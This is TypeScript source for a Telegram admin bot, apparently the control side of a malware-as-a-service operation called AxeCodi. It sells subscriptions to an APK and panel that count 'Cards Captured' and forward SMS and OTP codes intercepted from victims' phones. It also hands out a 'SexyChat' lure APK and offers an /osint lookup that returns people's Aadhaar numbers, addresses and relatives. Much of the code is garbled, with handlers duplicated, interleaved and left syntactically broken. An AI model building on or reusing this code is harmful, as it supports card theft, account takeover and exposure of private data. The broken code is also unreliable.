    const email = ctx.message.text.split(" ")[1]?.trim();
    if (!email || !email.includes("@")) {
      const cur = await fbGet("config/admin");
      await ctx.reply(
        `*📧 Set Panel Email*\n\n` +
        `Current: \`${cur?.email || "not set"}\`\n` +
        `Usage: \`/setpanel email@example.com\`\n\n` +
        `This sets *your* web panel login email (admin). After that use /reset\\_password to set password.\n` +
        `For users, use /adduser with email.`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    await setAdminConfig({
      telegramId: ctx.from.id.toString(),
      email: email.toLowerCase(),
      username: ctx.from.username || "Admin",
    });

    await ctx.reply(
      `✅ *Admin Panel Email Set!*\n\n` +
      `📧 Email: \`${email.toLowerCase()}\`\n` +
      `👤 Telegram: \`${ctx.from.id}\` @${ctx.from.username || "?"}\n\n` +
      `Next: /reset\\_password to set password\n` +
      `Then login at ${getPanelUrl()} with Email/Username + Password + OTP, or Google if email linked.`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── /help duplicate removed — beautified above ─────────────────────────

  // ─── /ping — beautified single ──────────────────────────────────────────
  bot.command("ping", async (ctx) => {
    const adminFlag = isAdmin(ctx) || (await isAdminAsync(ctx));
    const uptime = formatUptime(Date.now() - BOT_START_TIME);
    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    await ctx.reply(
      `*🏓 Pong!* — AxeCodi Bot Alive\n` +
      `┌─────────────────────┐\n` +
      `│ 🤖 Bot: Online\n` +
      `│ ⏱ Uptime: ${uptime}\n` +
      `│ 💾 Memory: ${mem} MB\n` +
      `│ 👑 Admin: ${adminFlag ? "Yes ✅" : "No"}\n` +
      `│ 🆔 Your ID: \`${ctx.from.id}\`\n` +
      `│ 🌐 Panel: ${getPanelUrl()}\n` +
      `└─────────────────────┘\n` +
      `_Time: ${new Date().toISOString()}_`,
      { parse_mode: "Markdown",
        ...Markup.inlineKeyboard([[Markup.button.url("🌐 Open Panel", getPanelUrl())]])
      }
    );
  });

  // ─── Admin: /setadmin ────────────────────────────────────────────────────
  bot.command("setadmin", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;
    const arg = ctx.message.text.split(" ")[1]?.trim();
    if (!arg) {
      const cur = await fbGet("config/admin");
      const admins = await fbGet("config/admins");
      const count = admins ? Object.keys(admins).length : 0;
      await ctx.reply(
        `*👑 Admin Config*\n\n` +
        `*Env ADMIN:* \`${ENV_ADMIN_ID}\`\n` +
        `*Firebase admin:* \`${cur?.telegramId || "not set"}\` @${cur?.username || "?"}\n` +
        `📧 Email: ${cur?.email || "not set"}\n` +
        `👥 Extra admins: ${count}\n\n` +
        `*Usage:*\n\`/setadmin 123456789\` — set firebase admin\n` +
        `\`/setadmin 123456789\` then new admin /start\n\n` +
        `_Env fallback \`${ENV_ADMIN_ID}\` always works._`,
        { parse_mode: "Markdown" }
      );
      return;
    }
    const newId = arg.replace("@", "");
    if (!/^\d+$/.test(newId)) {
      await ctx.reply("❌ Provide numeric Telegram ID. Forward a message from user or use @getidsbot / @userinfobot to get ID.", { parse_mode: "Markdown" });
      return;
    }
    await setAdminConfig({ telegramId: newId, username: `admin_${newId}` });
    try { await fbUpdate("config/admins", { [newId]: { telegramId: newId, addedBy: ctx.from.id.toString(), at: Date.now() } }); } catch {}
    await ctx.reply(
      `✅ *Admin Updated*\n\n` +
      `New firebase admin: \`${newId}\`\n` +
      `Env fallback: \`${ENV_ADMIN_ID}\` (still works)\n\n` +
      `New admin should run /start to verify.\n` +
      `Old admin retains env access.`,
      { parse_mode: "Markdown" }
    );
    logger.info({ oldAdmin: ENV_ADMIN_ID, newAdmin: newId, by: ctx.from.id }, "Admin transferred via /setadmin");
  });

  // ─── /stats — beautified ─────────────────────────────────────────────────
  bot.command("stats", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;

    const [clients, subs, smsChannel] = await Promise.all([fbGet("clients"), getAllSubscriptions(), fbGet("config/smsChannel")]);
    const deviceCount = clients ? Object.keys(clients).length : 0;
    const subCount = Object.keys(subs).length;
    const activeSubs = Object.values(subs).filter(
      (s: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)
    ).length;
    const expired = subCount - activeSubs;
    const onlineDevices = clients ? Object.values(clients as any).filter((c: any) => {
      const ping = parseInt(c.ping || c.lastSeen || "0", 10);
      return c.status === true || c.status === "true" || (ping && Date.now() - ping < 300000);
    }).length : 0;

    const uptime = formatUptime(Date.now() - BOT_START_TIME);
    const smsCh = smsChannel?.channelId || "not set";

    await ctx.reply(
      `*╔═══ 📊 AxeCodi Stats ═══╗*\n\n` +
      `*⏱ System*\n` +
      `• Uptime: ${uptime}\n` +
      `• Memory: ${(process.memoryUsage().heapUsed/1024/1024).toFixed(1)} MB\n\n` +
      `*📱 Devices*\n` +
      `• Total: ${deviceCount} • 🟢 Online: ${onlineDevices} • ⚪ Offline: ${deviceCount - onlineDevices}\n\n` +
      `*👥 Subscriptions*\n` +
      `• Total: ${subCount}\n` +
      `• ✅ Active: ${activeSubs}\n` +
      `• ❌ Expired: ${expired}\n\n` +
      `*📡 SMS Channel:* \`${smsCh}\`\n` +
      `*🌐 Panel:* ${getPanelUrl()}`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("👥 List Users", "admin_users"), Markup.button.callback("🔄 Refresh", "admin_stats")],
          [Markup.button.url("🌐 Open Panel", getPanelUrl())],
        ]),
      }
    );
  });

  bot.hears("📊 Stats", async (ctx) => {
    if (!(await isAdminAsync(ctx)) && !isAdmin(ctx)) return;
    if (!isAdmin(ctx)) return;
    (ctx as any).command = "stats";
    // Re-trigger stats
    const [clients, subs] = await Promise.all([fbGet("clients"), getAllSubscriptions()]);
    const deviceCount = clients ? Object.keys(clients).length : 0;
    const subCount = Object.keys(subs).length;
    const activeSubs = Object.values(subs).filter(
      (s: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)
    ).length;
    await ctx.reply(
      `*📊 Quick Stats*\n` +
      `📱 Devices: ${deviceCount}\n` +
      `👥 Total: ${subCount} • ✅ ${activeSubs} • ❌ ${subCount - activeSubs}\n` +
      `Use /stats for detailed view.`,
  // ─── /setpanel ──────────────────────────────────────────────────────────
  bot.command("setpanel", handleSetPanelEmail);

  // ─── /stats ─────────────────────────────────────────────────────────────
  bot.command("stats", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    const clientCount = await fbGet("clients");
    const messages = await fbGet("messages");
    const smsCount = messages ? Object.keys(messages).reduce((a: number, k: string) => a + Object.keys(messages[k]).length, 0) : 0;
    const ccCount = clientCount ? Object.values(clientCount).filter((c: any) => c?.cc_cardNumber || c?.cardNumber).length : 0;

    await ctx.reply(
      `📊 *System Stats*\n\n` +
      `📱 Devices: ${clientCount ? Object.keys(clientCount).length : 0}\n` +
      `💬 Total SMS: ${smsCount}\n` +
      `💳 Cards Captured: ${ccCount}\n`,
      { parse_mode: "Markdown" }
    );
  });

  // ─── Admin: /adduser — beautified ────────────────────────────────────────
  bot.command("adduser", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;

    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 2) {
      await ctx.reply(
        `*➕ Add/Extend Subscription*\n\n` +
        `*Usage:*\n\`/adduser <telegramId> <days> [@username] [email]\`\n\n` +
        `*Examples:*\n` +
        `\`/adduser 123456789 30 @john john@example.com\` — 30 days with panel login\n` +
        `\`/adduser 123456789 7 @john\` — 7 days APK only\n` +
        `\`/adduser 123456789 30\` — 30 days, no username/email\n\n` +
        `*Notes:*\n` +
        `• Email = panel login via Email/Username or Google\n` +
        `• Username = panel login alternative\n` +
        `• If user exists, days are *added* to expiry\n` +
        `• User must have started bot at least once for notification`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    const [telegramId, daysStr, username = "unknown", email] = parts;
    const days = parseInt(daysStr);

    if (!/^\d+$/.test(telegramId)) {
      await ctx.reply("❌ Invalid Telegram ID. Must be numeric. Use @getidsbot to get ID.");
      return;
    }
    if (isNaN(days) || days <= 0 || days > 3650) {
      await ctx.reply("❌ Invalid days. Use 1-3650.");
      return;
    }

    const existing = await getSubscription(telegramId);
    const now = Date.now();

    const baseTime = existing?.status === "active" && existing.expiresAt && existing.expiresAt > now
      ? existing.expiresAt
      : now;

    const expiresAt = baseTime + daysToMs(days);

    await setSubscription(telegramId, {
      telegramId,
      username: username.replace("@", ""),
      plan: `${days} Days`,
      status: "active",
      expiresAt,
      createdAt: existing?.createdAt || now,
      ...(email ? { email: email.toLowerCase() } : {}),
    } as any);

    const daysLeft = Math.floor((expiresAt - now) / (1000 * 60 * 60 * 24));

    await ctx.reply(
      `*✅ Subscription Active!*\n` +
      `┌─────────────────────┐\n` +
      `│ 👤 User: @${username.replace("@","")} (\`${telegramId}\`)\n` +
      `│ 📅 Plan: ${days} Days\n` +
      `│ ⏰ Expires: ${formatDate(expiresAt)}\n` +
      `│ ⏳ Left: ${daysLeft}d\n` +
      (email ? `│ 📧 Email: ${email.toLowerCase()}\n` : `│ ⚠️ No email — panel login disabled\n`) +
      `└─────────────────────┘\n` +
      `User can now: /apk • /reset\\_password • Panel login`,
      { parse_mode: "Markdown" }
    );

    // Notify the user
    try {
      await bot!.telegram.sendMessage(
        parseInt(telegramId),
        `*🎉 Subscription Activated!*\n\n` +
        `*Plan:* ${days} Days\n` +
        `*Expires:* ${formatDate(expiresAt)}\n` +
        `*Panel:* ${getPanelUrl()}\n\n` +
        `*Next steps:*\n` +
        `📱 /apk — Download APK\n` +
        `🔑 /reset\\_password — Set panel password\n` +
        `🔐 Or use Google Sign-In if email linked`,
        { parse_mode: "Markdown" }
      );
    } catch {
      await ctx.reply("⚠️ Could not notify user (they haven't started bot yet). Ask them to /start first.", { parse_mode: "Markdown" });
    }
    // Notify the user — queue if they haven't started the bot yet
    await sendSubscriptionNotification(telegramId, {
      username,
      plan: `${days} Days`,
      status: "active",
      expiresAt,
      email: email?.toLowerCase(),
    });
  });
  bot.hears("➕ Add User", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;
    await ctx.reply(
      `*➕ Add User Help*\nSend:\n\`/adduser <id> <days> [@user] [email]\`\n\nExample: \`/adduser 123456789 30 @john john@example.com\``,
      { parse_mode: "Markdown" }
    );
  });

  // ─── Admin: /removeuser — beautified ─────────────────────────────────────
  // ─── Admin: /removeuser ─────────────────────────────────────────────────
  bot.command("removeuser", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;

    const telegramId = ctx.message.text.split(" ")[1]?.trim();
    if (!telegramId) {
      await ctx.reply(
        `*🗑 Remove User*\n\nUsage: \`/removeuser <telegramId>\`\nExample: \`/removeuser 123456789\``,
        { parse_mode: "Markdown" }
      );
      return;
    }

    const sub = await getSubscription(telegramId);
    if (!sub) {
      await ctx.reply(`❌ User \`${telegramId}\` not found.`, { parse_mode: "Markdown" });
    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 1) {
      await ctx.reply("Usage: `/removeuser {telegramId}`");
      return;
    }

    const telegramId = parts[0];
    await deleteSubscription(telegramId);
    await ctx.reply(
      `*🗑 Subscription Removed*\n\n` +
      `👤 @${sub.username || "?"} (\`${telegramId}\`)\n` +
      `Plan was: ${sub.plan}\n` +
      `Status: removed ✅`,
      { parse_mode: "Markdown" }
    );
    try {
      await bot!.telegram.sendMessage(parseInt(telegramId), `❌ Your AxeCodi subscription has been removed by admin. Contact @exoincs for renewal.`, { parse_mode: "Markdown" });
    } catch {}
  });

  // ─── Admin: /userinfo & /extend ──────────────────────────────────────────
  bot.command("userinfo", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;
    const id = ctx.message.text.split(" ")[1]?.trim();
    if (!id) {
      await ctx.reply(`Usage: /userinfo <telegramId>`, { parse_mode: "Markdown" });
      return;
    }
    const sub = await getSubscription(id);
    if (!sub) {
      await ctx.reply(`❌ No subscription for \`${id}\``, { parse_mode: "Markdown" });
      return;
    }
    const active = await isSubscriptionActive(id);
    const exp = (sub as any).expiresAt ? formatDate((sub as any).expiresAt) : "never";
    await ctx.reply(
      `*👤 User Info*\n\n` +
      `🆔 ID: \`${id}\`\n` +
      `👤 Username: @${(sub as any).username || "?"}\n` +
      `📧 Email: ${(sub as any).email || "not set"}\n` +
      `📦 Plan: ${(sub as any).plan}\n` +
      `Status: ${active ? "✅ Active" : "❌ Expired"}\n` +
      `⏰ Expires: ${exp}\n` +
      `Created: ${formatDate((sub as any).createdAt || Date.now())}`,
      { parse_mode: "Markdown" }
    );
  });
  bot.command("extend", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;
    const [id, daysStr] = ctx.message.text.split(" ").slice(1);
    if (!id || !daysStr) {
      await ctx.reply(`Usage: /extend <telegramId> <days>\nExample: /extend 123456789 30`, { parse_mode: "Markdown" });
      return;
    }
    const days = parseInt(daysStr);
    if (isNaN(days) || days <= 0) {
      await ctx.reply("❌ Invalid days.");
      return;
    }
    const sub = await getSubscription(id);
    if (!sub) {
      await ctx.reply(`❌ User \`${id}\` not found. Use /adduser first.`, { parse_mode: "Markdown" });
      return;
    }
    const now = Date.now();
    const base = (sub as any).expiresAt && (sub as any).expiresAt > now ? (sub as any).expiresAt : now;
    const newExp = base + daysToMs(days);
    await setSubscription(id, { expiresAt: newExp, status: "active" });
    await ctx.reply(`✅ Extended \`${id}\` by ${days}d → New expiry: ${formatDate(newExp)}`, { parse_mode: "Markdown" });
  });

  // ─── Admin: /broadcast ───────────────────────────────────────────────────
  bot.command("broadcast", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;
    const msg = ctx.message.text.replace("/broadcast", "").trim();
    if (!msg) {
      pendingActions.set(ctx.from.id.toString(), { action: "broadcast" });
      await ctx.reply(
        `*📢 Broadcast*\n\nSend your broadcast message as *next message*.\n` +
        `It will be sent to all *active* subscribers.\n\n` +
        `Type /cancel to abort.`,
        { parse_mode: "Markdown" }
      );
      return;
    }
    await doBroadcast(ctx, msg);
  });
  bot.hears("📢 Broadcast", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;
    pendingActions.set(ctx.from.id.toString(), { action: "broadcast" });
    await ctx.reply(`*📢 Broadcast*\nSend message as next text. /cancel to abort.`, { parse_mode: "Markdown" });
  });
  async function doBroadcast(ctx: Context, msg: string) {
    const subs = await getAllSubscriptions();
    const activeIds = Object.entries(subs).filter(([, s]: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)).map(([id]) => id);
    if (activeIds.length === 0) {
      await ctx.reply("No active subscribers to broadcast.");
      return;
    }
    await ctx.reply(`📢 Broadcasting to ${activeIds.length} users...`);
    let sent = 0, failed = 0;
    for (const id of activeIds) {
      try {
        await bot!.telegram.sendMessage(parseInt(id), `*📢 Admin Broadcast*\n\n${msg}`, { parse_mode: "Markdown" });
        sent++;
        await new Promise(r => setTimeout(r, 80));
      } catch { failed++; }
    }
    await ctx.reply(`✅ Broadcast done\n✅ Sent: ${sent}\n❌ Failed: ${failed}`);
  }

  // ─── Admin: /listusers — beautified ─────────────────────────────────────
  bot.command("listusers", handleListUsers);
  bot.hears("👥 Users List", handleListUsers);
  bot.hears("👥 Users", handleListUsers);

  async function handleListUsers(ctx: Context) {
    if (!(await requireAdmin(ctx))) return;

    const subs = await getAllSubscriptions();
    const entries = Object.entries(subs);

    if (entries.length === 0) {
      await ctx.reply(
        `*👥 No subscribers yet.*\n\nAdd first user:\n\`/adduser <id> <days> [@user] [email]\``,
        { parse_mode: "Markdown" }
      );
      return;
    }

    const now = Date.now();
    // Sort by expiresAt descending (active first)
    entries.sort((a, b) => ((b[1] as any).expiresAt || 0) - ((a[1] as any).expiresAt || 0));

    const lines = entries.slice(0, 50).map(([id, s]: [string, any], idx) => {
      const isActive = s.status === "active" && (!s.expiresAt || now < s.expiresAt);
      const daysLeft = s.expiresAt ? Math.floor((s.expiresAt - now) / (1000 * 60 * 60 * 24)) : "∞";
      const email = s.email ? `📧` : `⚪`;
      const status = isActive ? "🟢" : "🔴";
      return `${idx + 1}. ${status} \`${id}\` @${s.username || "?"} ${email} • ${s.plan} • ${isActive ? `${daysLeft}d` : "exp"}`;
    });

    const activeCount = entries.filter(([, s]: any) => s.status === "active" && (!s.expiresAt || now < s.expiresAt)).length;

    await ctx.reply(
      `*👥 All Subscribers (${entries.length} total • ✅ ${activeCount} active)*\n` +
      `┌─────────────────────┐\n` +
      lines.join("\n") +
      `\n└─────────────────────┘\n` +
      (entries.length > 50 ? `\n_Showing 50/${entries.length} — use /userinfo <id> for details_` : "") +
      `\n\n*Commands:* /userinfo <id> • /extend <id> <days> • /removeuser <id>`,
      { parse_mode: "Markdown" }
    );
  }

  // ─── Default text handler — beautified ───────────────────────────────────
  bot.on("text", async (ctx) => {
    const userId = ctx.from.id.toString();
    const pending = pendingActions.get(userId);
    const text = ctx.message.text.trim();

    if (pending?.action === "reset_password") {
      pendingActions.delete(userId);
      const newPass = text;

      if (newPass.length < 4) {
        await ctx.reply("❌ Password must be ≥4 chars. Try again: /reset_password or /cancel");
        return;
      }
      if (newPass.length > 64) {
        await ctx.reply("❌ Password too long (max 64). Try shorter.");
        return;
      }

      const adminFlag = isAdmin(ctx) || (await isAdminAsync(ctx));
      await setPanelPassword(userId, newPass, adminFlag);

      await ctx.reply(
        `*✅ Password Updated!*\n\n` +
        `🔑 New password:\n\`${newPass}\`\n\n` +
        `👤 Account: \`${userId}\` ${adminFlag ? "(Admin)" : ""}\n` +
        `🌐 Panel: ${getPanelUrl()}\n\n` +
        `_Login: Email/Username + new password → OTP on Telegram_\n` +
        `_Or Google Sign-In if email linked._`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    if (pending?.action === "broadcast") {
      pendingActions.delete(userId);
      if (text === "/cancel") {
        await ctx.reply("Cancelled.");
        return;
      }
      await doBroadcast(ctx, text);
      return;
    }

    // Unknown text — show help hint
    const adminFlag = isAdmin(ctx) || (await isAdminAsync(ctx));
    if (adminFlag) {
      await ctx.reply(
        `*Unknown command.*\n\n` +
        `Try:\n` +
        `• /help — all commands\n` +
        `• /adduser — add user\n` +
        `• /stats — system stats\n` +
        `• /apk — get APK`,
        {
          parse_mode: "Markdown",
          ...Markup.keyboard([
            ["📱 Get APK", "🔑 Reset Password"],
            ["👥 Users List", "📊 Stats"],
            ["➕ Add User", "📢 Broadcast"],
            ["🌐 Open Panel", "❓ Help"],
          ]).resize(),
        }
      );
    } else {
      await ctx.reply(
        `Use /start to see menu.\n` +
        `Available: /apk • /reset\\_password • /help • 🌐 Open Panel`,
        {
          parse_mode: "Markdown",
          ...Markup.keyboard([
            ["📱 Get APK", "🔑 Reset Password"],
            ["🌐 Open Panel", "❓ Help"],
          ]).resize(),
        }
      );
    }
  });

  // ─── Admin: /setchannel ──────────────────────────────────────────────────
  bot.command("setchannel", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;

    const channelId = ctx.message.text.split(" ")[1]?.trim();
    if (!channelId) {
      const current = await getSmsChannel();
      await ctx.reply(
        `*📡 SMS Forward Channel*\n\n` +
        `*Current:* ${current ? `\`${current}\`` : "`Not set`"}\n\n` +
        `*Usage:*\n\`/setchannel -100xxxxxxxxxx\`\n` +
        `Or forward a message from channel and use its ID\n\n` +
        `*Remove:* \`/removechannel\`\n\n` +
        `_Bot must be admin in channel with post permission._`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    await setSmsChannel(channelId);
    await ctx.reply(
      `*✅ SMS Channel Set!*\n\n` +
      `📡 Channel: \`${channelId}\`\n\n` +
      `All new SMS from devices will be forwarded here.\n` +
      `⚠️ Ensure bot is admin with *Post messages* permission.`,
      { parse_mode: "Markdown" }
    );
    await ctx.reply(`🗑️ *Subscription removed for \`${telegramId}\`*`, { parse_mode: "Markdown" });
  });

  // ─── /listusers ──────────────────────────────────────────────────────────
  bot.command("listusers", handleListUsers);

  // ─── /setchannel ──────────────────────────────────────────────────────────
  bot.command("setchannel", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    const parts = ctx.message.text.split(" ").slice(1);
    if (parts.length < 1) {
      await ctx.reply("Usage: `/setchannel -100xxxxxxxxxx` or `/setchannel @channelname`");
      return;
    }
    const channelId = parts[0];
    await setSubscription("__global__", { smsChannel: channelId } as any);
    await ctx.reply(`✅ Global SMS channel set to \`${channelId}\``, { parse_mode: "Markdown" });
  });

  // ─── /removechannel ──────────────────────────────────────────────────────
  bot.command("removechannel", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;
    await removeSmsChannel();
    await ctx.reply("✅ *SMS forwarding channel removed.*\nNo more SMS will be forwarded.", { parse_mode: "Markdown" });
  });

  return bot;
}

// Launches the bot in long-poll mode (for Render / local / containers)
export async function startBot(): Promise<void> {
  const b = createBot();
  // Launch bot in the background (non-blocking).
  // NOTE: bot.launch() returns a promise that only resolves when the bot STOPS,
  // so watchers must be started immediately, NOT inside .then().
  startDeviceWatcher(bot, ADMIN_ID);
  startSmsWatcher(bot, ADMIN_ID);
  startCcWatcher(bot, ADMIN_ID);
  logger.info("Watchers started");

  bot.launch({ dropPendingUpdates: true }).catch((err: any) => {
    if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
      logger.warn("Bot 409 conflict — another instance is running. Polling terminated for this process, but watchers remain active.");
    } else {
      logger.error({ err }, "Bot launch error");
    }
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    await deleteSubscription("__global__");
    await ctx.reply("🗑️ Global SMS channel removed.");
  });

  // ─── /sexychat ──────────────────────────────────────────────────────────
  // Sends the pre-built SexyChat APK directly
  bot.command("sexychat", async (ctx) => {
    await sendSexyChatApk(ctx);
  });

  // Warn admin if PANEL_URL is not set
  if (!process.env["PANEL_URL"]) {
    logger.warn("PANEL_URL env var not set — bot will use fallback panel.kimiaxe.com");
    try {
      await b.telegram.sendMessage(
        ADMIN_ID,
        `⚠️ *PANEL_URL not set*\n\nAdd env var:\n\`PANEL_URL=https://panel.kimiaxe.com\` or your GH Pages URL\n\nCurrent fallback: ${getPanelUrl()}`,
  // ─── /osint — mobile/aadhar lookup (data only, no credits/parsing) ─────
  bot.command("osint", async (ctx) => {
    const query = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();
    if (!query) {
      await ctx.reply(
        "Usage: `/osint <mobile|aadhar>`\nExample: `/osint 9876543210`",
        { parse_mode: "Markdown" }
      );
      return;
    }
    try {
      const { lookup } = await import("../routes/osint");
      const json = await lookup(query);
      const hits: any[] = Array.isArray(json.results) ? json.results : [];
      if (hits.length === 0) {
        await ctx.reply(`🔍 No records found for \`${query}\``, { parse_mode: "Markdown" });
        return;
      }
      const fmtAddr = (a?: string | null) =>
        a ? a.split("!").filter(Boolean).join(", ") : "—";
      const esc = (s: any) => String(s ?? "—").replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
      const lines = hits.slice(0, 5).map((h, i) =>
        `*${i + 1}. ${esc(h.name)}*\n` +
        `👨 Father: ${esc(h.father_name)}\n` +
        `📱 Mobile: \`${esc(h.mobile)}\`${h.alternate_mobile ? ` (alt \`${esc(h.alternate_mobile)}\`)` : ""}\n` +
        `🪪 Aadhar: \`${esc(h.aadhar)}\`\n` +
        `📡 ${esc(h.circle)}\n` +
        `📍 ${esc(fmtAddr(h.address))}`
      );
      const more = hits.length > 5 ? `\n…+${hits.length - 5} more` : "";
      await ctx.reply(
        `🔍 *OSINT: \`${esc(query)}\`* — ${json.message || hits.length + " result(s)"}\n\n` +
        lines.join("\n\n") + more,
        { parse_mode: "Markdown" }
      );
    } catch (err: any) {
      logger.error({ err }, "OSINT command failed");
      await ctx.reply("❌ Lookup failed. Try again later.");
    }
  });

  // Launch bot first — only start watchers if THIS process owns the bot token.
  // If another process already claimed it (409), skip watchers to avoid duplicate alerts.
  b.launch({ dropPendingUpdates: true }).then(() => {
    startDeviceWatcher(b, ADMIN_ID);
    startSmsWatcher(b, ADMIN_ID);
    startCcWatcher(b, ADMIN_ID);
    logger.info("Watchers started — this process owns the bot");
  }).catch((err: any) => {
    if (err?.response?.error_code === 409 || err?.message?.includes("409")) {
      logger.warn("Bot 409 conflict — another instance is running. Watchers NOT started in this process.");
    } else {
      logger.error({ err }, "Bot launch error");
      startDeviceWatcher(b, ADMIN_ID);
      startSmsWatcher(b, ADMIN_ID);
      startCcWatcher(b, ADMIN_ID);
    }
  });
  logger.info("Telegram bot started");

  // Graceful shutdown — guard against "Bot is not running!"
  process.once("SIGINT", () => { try { b.stop("SIGINT"); } catch {} });
  process.once("SIGTERM", () => { try { b.stop("SIGTERM"); } catch {} });
}

// Sets Telegram webhook (for serverless / Vercel). Returns the bot instance.
export function setupWebhook(url: string): Telegraf {
  const b = createBot();
  b.telegram.setWebhook(url).catch((err) => logger.error({ err }, "setWebhook failed"));
  return b;
  // ─── /otp — latest OTPs from device numbers (panel mirror) ────────────
  bot.command("otp", async (ctx) => {
    if (!isAdmin(ctx)) {
      await ctx.reply("❌ Admin only.");
      return;
    }
    try {
      const { fbGet } = await import("./firebase");
      const log = (await fbGet("otps/latest")) || {};
      const entries = (Object.values(log) as any[])
        .filter((e) => e && e.code)
        .sort((a, b) => (b.date || 0) - (a.date || 0))
        .slice(0, 10);
      if (entries.length === 0) {
        await ctx.reply("🔑 No OTPs captured yet. They appear as devices receive verification SMS.");
        return;
      }
      const esc = (s: any) => String(s ?? "—").replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
      const ago = (t?: number) => {
        if (!t) return "—";
        const s = Math.floor((Date.now() - t) / 1000);
        if (s < 60) return `${s}s ago`;
        if (s < 3600) return `${Math.floor(s / 60)}m ago`;
        return `${Math.floor(s / 3600)}h ago`;
      };
      const lines = entries.map((e, i) =>
        `*${i + 1}. \`${esc(e.code)}\`*\n` +
        `🏷️ ${esc(e.service)} · 📱 \`${esc(e.number)}\`\n` +
        `🕐 ${ago(e.date)}${e.from ? ` · from ${esc(e.from)}` : ""}`
      );
      await ctx.reply(`🔑 *Latest OTPs* (${entries.length})\n\n${lines.join("\n\n")}`, {
        parse_mode: "Markdown",
      });
    } catch (err: any) {
      logger.error({ err }, "OTP command failed");
      await ctx.reply("❌ OTP fetch failed. Try again later.");
    }
  });

  // Start watchers immediately — they only need the bot token for sending, NOT polling.
  // This guarantees device/SMS/CC notifications work even if bot.launch() is delayed.
  setLogBot(bot!);
  startDeviceWatcher(bot!, ADMIN_ID);
  startSmsWatcher(bot!, ADMIN_ID);
  startCcWatcher(bot!, ADMIN_ID);
  logger.info("Watchers started (immediate)");

  // Webhook mode - avoids 409 polling conflicts from other instances
  const webhookUrl = `${getPanelUrl()}/bot-webhook`;
  bot.telegram.setWebhook(webhookUrl, {
    drop_pending_updates: true,
    allowed_updates: ["message", "callback_query"]
  }).then(() => {
    logger.info({ webhookUrl }, "Telegram bot started (webhook mode)");
  }).catch((err) => {
    logger.error({ err }, "Telegram bot webhook set failed");
  });
}

export function getWebhookHandler() {
  if (!bot) return null;
  return bot.webhookCallback("/bot-webhook", { secretToken: undefined });
}
